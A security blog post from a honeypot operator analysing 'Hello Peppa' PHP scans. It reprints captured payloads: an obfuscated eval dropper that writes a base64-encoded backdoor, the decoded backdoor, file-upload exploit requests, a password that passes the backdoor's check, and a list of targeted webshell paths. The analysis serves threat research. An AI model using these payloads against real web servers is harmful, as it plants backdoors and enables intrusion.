---
layout: article
title: Hello Peppa
---

My colleague handler Guy Bruneau wrote a diary [1] about "Hello Peppa" scans previous
week. He encountered a large amount of scans in his honeypot, containing a payload
with the string "Hello Peppa". In our honeytrap network we are following these scans
for a while now, and collected additional information about these attacks.

As mentioned in the comments of the other diary, the string Peppa could be a
reference to Peppa Pig [2] and its removal from a Chinese video-sharing platform.

The first occurence of the "Hello Peppa" payload, has been on June 16th. They
are all targeting port 80 only and we've seen 34 different attacking ip
addresses. All attacks have the same useragent "Mozilla/5.0".

![Hello peppa](/assets/articles/hello-peppa/hello-peppa-1.gif)

Looking at the animated screenshot, there are three different clusters appearing
in time. The clusters indicate changes of approaches, where different payloads
are being used by different source ips.

During the internship of my colleagues Nordin van Nes, Thomas Oomens and Martijn
Janssen they implemented a LUA extension to Honeytrap, returning the expected
response "Hello, Peppa!999999999". This resulted in the follow-up attack
payloads:

```
m=eval($_POST["h"])&mx=eval($_POST["h"])&7788=eval($_POST["h"])&h=die(@file_put_contents("images.php",\'<?php $func=\\\'c\\\'.\\\'r\\\'.\\\'e\\\'.\\\'a\\\'.\\\'t\\\'.\\\'e\\\'.\\\'_\\\'.\\\'f\\\'.\\\'u\\\'.\\\'n\\\'.\\\'c\\\'.\\\'t\\\'.\\\'i\\\'.\\\'o\\\'.\\\'n\\\';$test=$func(\\\'$x\\\',\\\'e\\\'.\\\'v\\\'.\\\'a\\\'.\\\'l\\\'.\\\'(b\\\'.\\\'a\\\'.\\\'s\\\'.\\\'e\\\'.\\\'6\\\'.\\\'4\\\'.\\\'_\\\'.\\\'d\\\'.\\\'e\\\'.\\\'c\\\'.\\\'o\\\'.\\\'d\\\'.\\\'e($x));\\\');$test(\\\'QHNlc3Npb25fc3RhcnQoKTtpZihpc3NldCgkX1BPU1RbJ2NvZGUnXSkpeyhzdWJzdHIoc2hhMShtZDUoQCRfUE9TVFsnYSddKSksMzYpPT0nMjIyZicpJiYkX1NFU1NJT05bJ3RoZUNvZGUnXT10cmltKCRfUE9TVFsnY29kZSddKTt9aWYoaXNzZXQoJF9TRVNTSU9OWyd0aGVDb2RlJ10pKXtAZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VTU0lPTlsndGhlQ29kZSddKSk7fQ==\\\'); ?>\',LOCK_EX) ? "success" : "failed");'
```

The follow-ups are using a different useragent: "Mozilla/5.0 (Windows NT 6.1;
Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" while targeting url:
"/sheep.php".

The payload will write a file "images.php" and eval the base64 encoded string,
decoded as:

```
@session_start();if(isset($_POST['code'])){(substr(sha1(md5(@$_POST['a'])),36)=='222f')&&$_SESSION['theCode']=trim($_POST['code']);}if(isset($_SESSION['theCode'])){@eval(base64_decode($_SESSION['theCode']));}
```

Interesting about this code is that is tries to protect its execution by the
value of the field a which is being hashed by both md5 and sha, but only the
last 4 characters are being verified. This is easy to circumvent and as an
example, the password w2xm73zrc09hpo5v works.

We've caught also another payload (unfortunately truncated by 1024 bytes):

```
--------------------------43552f5f8d94619e
Content-Disposition: form-data; name="_upl"

Upload
--------------------------43552f5f8d94619e
Content-Disposition: form-data; name="h"

if (copy($_FILES[fileupload][tmp_name],$_FILES[fileupload][name])) die("success");
--------------------------43552f5f8d94619e
Content-Disposition: form-data; name="w"

if (copy($_FILES[fileupload][tmp_name],$_FILES[fileupload][name])) die("success");
--------------------------43552f5f8d94619e\r\nContent-Disposition: form-data; name="leng"

if (copy($_FILES[fileupload][tmp_name],$_FILES[fileupload][name])) die("success");
--------------------------43552f5f8d94619e\r\nContent-Disposition: form-data; name="a"
if (copy($_FILES[fileupload][tmp_name],$_FILES[fileupload][name])) die("success");
--------------------------43552f5f8d94619e\r\nContent-Disposition: form-data; name="b"

if (copy($_FILES[fileupload][tmp_name],$_FILES[fileupload][name])) die("success");
--------------------------43552f5f8d94619e\r\nContent-Dispositio
```


This time using useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", while targeting url db_session.init.php. The payload is more some kind of brute forcing different exploit scripts, by sending different parameters with the same value, which will put the uploaded file somewhere it will be reachable.

Many of the attacks are originated from China, with the USA as second. The first attack we've seen has been from Chinese ip 119.28.44.140.

Till now, we've seen the following payloads, in first occurences order:

1. `[.+]=die('Hello, Peppa!')`
2. `[.+]==die((string)(111111111*9))`
3. `[.+]=die('Hello, Peppa!'.(string)(111111111*9))`
4. `[.+]=die('Hello, Peppa!'.(string)(123456789*9));`

![Hello peppa](/assets/articles/hello-peppa/hello-peppa-2.png)

The payload has been maturing, starting first with the "Hello Peppa" payload, then adding a small calculation to verify if the eval worked instead of just responding the same string. This could be to circumvent detection mechanisms or honeypots. What you see in the screenshot are 4 clusters, which are not related. This means that none of the source ips and payloads are common, as being a different attack.

Within our honeytrap network, we've seen the following urls being targeted:

* /
* /7788.php
* /8899.php
* /9678.php
* /ak47.php
* /conflg.php
* /db.init.php
* /db__.init.php
* /db_session.init.php
* /feixiang.php (Feixiang is a district of southern Hebei province, China)
* /lindex.php
* /mx.php
* /phpstudy.php
* /qq.php
* /s.php
* /sheep.php
* /w.php
* /wc.php
* /weixiao.php (Chinese League of Legends profession player for the team World Elite)
* /wshell.php
* /wuwu11.php
* /xiaoma.php
* /xshell.php
* /xw.php
* /xw1.php
* /xx.php

![Hello peppa](/assets/articles/hello-peppa/hello-peppa-3.gif)

Looking at the progress in time, you'll find out that the attacks are being extended with extra urls. Each cluster is the attack url and source ip, starting at just a few urls, and at the end all urls are being hit. So at time they are improving there attack and payloads, expanding on the amount of urls and testing other payloads.

Between the attacking servers there is a large amount running Windows with XAMPP installed. There are also different attacks being tried, like a PROPFIND exploit, phpmyadmin and the exploitation of previous attacks.

If you look at one attack specific, you'll see the following being tested:

{% include helloPeppaTable.html %}

References:
1. https://edition.cnn.com/2018/05/01/asia/china-peppa-pig-censorship-intl/index.html
2. https://isc.sans.edu/forums/diary/Hello+Peppa+PHP+Scans/23826/

Remco Verhoef (@remco_verhoef)
ISC Handler - Founder of DutchSec
PGP Key